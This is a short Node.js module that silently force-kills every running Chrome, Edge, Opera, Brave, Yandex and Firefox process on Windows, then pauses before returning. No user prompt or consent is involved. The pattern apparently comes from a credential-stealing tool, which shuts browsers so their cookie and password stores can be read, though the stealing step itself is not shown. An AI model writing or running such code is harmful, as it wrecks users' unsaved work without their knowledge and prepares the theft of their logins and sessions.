const { execSync, exec } = require("child_process");

function Browsers() {
  const browsersProcess = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "yandex.exe", "firefox.exe"];

  return new Promise(async (res) => {
    try {
      const tasks = execSync("tasklist");

      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) exec(`taskkill /IM ${process} /F`);
      });

      await new Promise((resolve) => setTimeout(resolve, 2500));

      res();
    } catch {
      res();
    }
  });
}

module.exports = { Browsers };
